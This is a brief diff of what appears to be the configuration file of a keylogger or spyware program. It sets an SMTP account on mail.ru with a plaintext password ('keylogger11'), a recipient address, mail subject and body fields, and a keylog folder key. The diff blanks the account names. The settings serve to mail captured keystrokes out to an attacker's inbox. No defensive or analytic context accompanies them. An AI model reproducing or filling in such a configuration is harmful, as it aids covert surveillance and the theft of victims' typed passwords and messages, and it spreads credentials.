@@ -1,8 +1,8 @@
-email:pspyware@mail.ru
+email:@mail.ru
 pass:keylogger11
 server:smtp.mail.ru
 port:465
-to:pspyware@mail.ru
+to:@mail.ru
 sbj:Subject_Mail
 body:Body_Mail
 fld_key:Folder_Keylog
